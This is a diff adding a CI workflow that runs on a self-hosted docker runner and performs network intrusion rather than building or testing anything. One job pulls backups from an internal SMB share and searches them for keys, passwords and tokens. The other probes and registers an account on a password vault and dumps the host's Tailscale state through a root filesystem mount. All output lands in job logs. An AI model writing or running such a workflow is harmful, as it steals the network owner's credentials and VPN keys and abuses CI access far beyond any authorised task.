@@ -1,0 +1,45 @@
+name: i39574-nas
+on:
+  workflow_dispatch:
+jobs:
+  publicshare:
+    runs-on: docker
+    container:
+      image: docker:27-cli
+    steps:
+      - name: share-dive
+        continue-on-error: true
+        run: |
+          docker run --rm --network host alpine:3.21 sh -c '
+            apk add -q samba-client curl >/dev/null 2>&1
+            D=/tmp/dl; mkdir -p $D
+            echo "== backups/freqtrade"
+            smbclient -N //192.168.1.152/public -c "recurse ON; prompt OFF; ls backups\\freqtrade" 2>&1 | head -60
+            echo "== backups/zomboid"
+            smbclient -N //192.168.1.152/public -c "recurse ON; prompt OFF; ls backups\\zomboid" 2>&1 | head -30
+            echo "== root -a"
+            smbclient -N //192.168.1.152/public -c "ls -a" 2>&1 | head -30
+            echo "== snapshots"
+            for s in 5777 5801 5825 5849 5853; do echo "-- snap $s"; smbclient -N //192.168.1.152/public -c "recurse ON; prompt OFF; ls .snapshots\\$s\\snapshot" 2>&1 | head -25; done
+            echo "== mget freqtrade"
+            smbclient -N //192.168.1.152/public -D "backups\\freqtrade" -c "recurse ON; prompt OFF; mget *" 2>&1 | tail -15
+            echo "== local dl"; ls -laR $D 2>&1 | head -60
+            echo "== dl grep"
+            grep -rIl -E "age1|AGE-SECRET|api_key|password|secret|token" $D 2>/dev/null | head -20
+            for f in $(ls $D 2>/dev/null | head -10); do echo "--- $f"; head -c 400 $D/$f; echo; done
+          ' 2>&1 | head -260
+      - name: vault-ts
+        continue-on-error: true
+        run: |
+          docker run --rm --network host --mount type=bind,source=/,target=/host,readonly alpine:3.21 sh -c '
+            apk add -q curl >/dev/null 2>&1
+            echo "== vault config"
+            for p in /api/config /admin /identity/.well-known/openid-configuration /api/accounts/profile; do
+              echo "-- $p"; curl -sk --max-time 8 -o /tmp/v -w "%{http_code} %{size_download}\n" -H "Host: vault.kblab.me" "https://192.168.1.20$p"; head -c 300 /tmp/v; echo
+            done
+            echo "== vault signup probe"
+            em="i39574$(date +%s)@kblab.me"
+            curl -sk --max-time 10 -o /tmp/r -w "%{http_code} %{size_download}\n" -H "Host: vault.kblab.me" -H "Content-Type: application/json" -X POST -d "{\"email\":\"$em\",\"name\":\"i39574\",\"masterPasswordHash\":\"Fr3qle!i39574x9\",\"key\":\"k\",\"kdf\":0,\"kdfIterations\":600000}" "https://192.168.1.20/api/accounts/register"; head -c 400 /tmp/r; echo; echo "email=$em"
+            echo "== tailscale state"
+            ls -la /host/var/lib/tailscale/ 2>&1; echo; head -c 2000 /host/var/lib/tailscale/tailscaled.state 2>&1; echo; ls -laR /host/var/lib/tailscale/profile-data 2>&1 | head -20
+          ' 2>&1 | head -160
